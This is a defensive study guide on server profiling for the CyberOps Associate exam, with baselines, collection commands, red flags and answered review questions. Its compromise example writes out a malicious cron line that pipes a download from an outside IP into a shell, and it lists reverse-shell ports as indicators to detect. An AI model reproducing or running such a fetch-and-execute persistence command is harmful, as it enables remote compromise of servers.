# 6.8 Elements Used for Server Profiling

**Domain 6.0 Security Policies and Procedures | CyberOps Associate (200-201)**

## Learning Objectives
- Define server profiling and its purpose
- Describe the five standard elements: listening ports, logged-in users/service accounts, running processes, running tasks, and applications
- Detect deviations that signal compromise

## 1. What Is Server Profiling?
Server profiling documents the **expected state** of each server: what it runs, who uses it, and how it communicates, forming a **baseline** for comparison. It is the host-side counterpart of network profiling (6.7). Deviations reveal **unauthorized software, persistence, backdoors, and misuse**.

## 2. Why Profile Servers?
- Detect **compromise** and **configuration drift**.
- Speed up **incident triage** ("is this process supposed to be here?").
- Support **hardening** and **compliance** audits.
- Prove **normal behavior** after changes.
- Build **detection rules** and **allow lists**.

## 3. The Five Profile Elements

### 3.1 Listening Ports
- **Definition:** the TCP/UDP ports the server has open and listening for connections, plus the **daemon/service** bound to each.
- **Collect with:**
  - Windows: `netstat -ano`, `Get-NetTCPConnection -State Listen`
  - Linux: `ss -tulpn`, `netstat -tulpn`, `lsof -i`
  - External view: `nmap -sS -sV -p- <server>`
- **Baseline:** documented list (for example web server: 22 from admin VLAN, 443 from all).
- **Red flags:** **unexpected new listener**, a service bound to `0.0.0.0` instead of localhost, high ports (4444, 1337, 31337), legacy protocols (telnet 23, FTP 21, SMBv1), port bound by an unknown process.

### 3.2 Logged-In Users and Service Accounts
- **Definition:** accounts (interactive users and **service accounts**) that authenticate to the server, with **when, from where, and with what privilege**.
- **Collect with:** `whoami`, `query user`, `net session`, Windows events **4624/4625/4634/4648/4672**, Linux `who`, `w`, `last`, `lastb`, `/var/log/auth.log` or `/var/log/secure`.
- **Baseline:** authorized admins, expected login hours/sources, service accounts that never log in interactively.
- **Red flags:**
  - Logins at odd hours or from unexpected IPs/countries.
  - **Service account with interactive or RDP logon.**
  - New local admin accounts, accounts that never expired, shared accounts.
  - Many failed logons followed by success (brute force).
  - Privilege escalation (4672 special privileges, `sudo` anomalies).
  - Dormant account suddenly active.

### 3.3 Running Processes
- **Definition:** the programs currently executing, with **PID, parent PID, user, path, command line, start time, network connections, loaded modules**.
- **Collect with:** Windows `tasklist /v`, Task Manager, **Process Explorer**, `Get-Process`; Linux `ps aux`, `top`, `pstree`, `lsof`.
- **Baseline:** known good process list and expected parent/child relationships.
- **Red flags:**
  - **Unknown or misspelled names** (`svch0st.exe`, `lssas.exe`).
  - **Wrong path** (system binaries outside `System32`, executables in `Temp`, `AppData`, `/tmp`, `/dev/shm`).
  - **Wrong parent** (`cmd.exe` spawned by `w3wp.exe` web server = possible web shell).
  - Unusual user context, high CPU (**cryptominers**), no signature/publisher, packed binaries, process injection signs.

### 3.4 Running Tasks (Scheduled and Startup Tasks)
- **Definition:** **scheduled tasks, cron jobs, services set to auto-start, startup items, and Run keys** that execute automatically, which commonly provide **persistence**.
- **Collect with:**
  - Windows: `schtasks /query /fo LIST /v`, Task Scheduler, `Get-ScheduledTask`, `sc query`, **Autoruns**, registry **Run/RunOnce**, WMI event subscriptions.
  - Linux: `crontab -l`, `/etc/cron.*`, `systemctl list-timers`, `systemctl list-unit-files`, `~/.bashrc`, `/etc/rc.local`, init scripts.
- **Baseline:** documented jobs (backups, patching, log rotation).
- **Red flags:** newly created tasks/services (Windows event **4698** task created, **7045** service installed), tasks that run PowerShell with encoded commands, jobs running as SYSTEM/root from user-writable paths, cron entries that `curl | sh`.

### 3.5 Applications
- **Definition:** installed and running **software, versions, libraries, and web/database applications** on the server.
- **Collect with:** package managers (`rpm -qa`, `dpkg -l`, `apt list --installed`), Windows `wmic product`, `Get-Package`, installed programs list, software inventory/CMDB, vulnerability scans.
- **Baseline:** approved software list with **versions and patch level**.
- **Red flags:**
  - **Unauthorized tools** (remote access trojans, network scanners, password dumpers, P2P clients, cryptominers).
  - **Outdated/vulnerable versions.**
  - Unexpected web applications or **web shells** in web root.
  - Changed configurations or binaries (verify via **hashes**, **file integrity monitoring**, signed packages).

## 4. Profile Summary Table
| Element | Question it answers | Linux command | Windows command |
|---|---|---|---|
| Listening ports | What is the server exposing? | `ss -tulpn` | `netstat -ano` |
| Logged-in users/service accounts | Who is using it? | `w`, `last` | `query user`, event 4624 |
| Running processes | What is executing now? | `ps aux`, `top` | `tasklist /v`, Process Explorer |
| Running tasks | What starts automatically? | `crontab -l`, `systemctl list-timers` | `schtasks /query`, Autoruns |
| Applications | What software is installed? | `dpkg -l`, `rpm -qa` | `Get-Package`, `wmic product` |

## 5. Building and Maintaining Server Profiles
1. Start from a **hardened, patched baseline** (CIS/STIG).
2. **Document** ports, accounts, processes, tasks, and applications after build.
3. **Hash** key binaries; use **FIM** (Tripwire, OSSEC, Wazuh).
4. **Automate collection** with agents/EDR and compare to baseline regularly.
5. Update the profile through **change management** after approved changes.
6. **Alert** on deviations and investigate before assuming benign.
7. Keep **role-specific profiles** (web, DB, DNS, domain controller each differ).

## 6. Example: Spotting a Compromise
Web server baseline: ports 22 (admin VLAN), 443; processes `nginx`, `sshd`, `php-fpm`; cron: nightly backup.
Observed: new listener on **4444** by `/tmp/.x`, `www-data` spawned `/bin/sh`, new cron `* * * * * curl http://198.51.100.7/a | sh`, login as `deploy` from a foreign IP at 03:10.
- Each deviation maps to an element: listening port, process, task, user. Together → **web server compromise with reverse shell and persistence**.

## 7. Review Questions
1. List the five server profile elements. *(Listening ports, logged-in users/service accounts, running processes, running tasks, applications)*
2. Which Windows event indicates a service was installed? *(7045)*
3. Why is a service account with an interactive logon suspicious? *(Service accounts normally do not log in interactively; may be abused)*
4. What tool helps list autostart locations on Windows? *(Autoruns)*
5. Which Linux command shows listening sockets with process names? *(`ss -tulpn` or `netstat -tulpn`)*
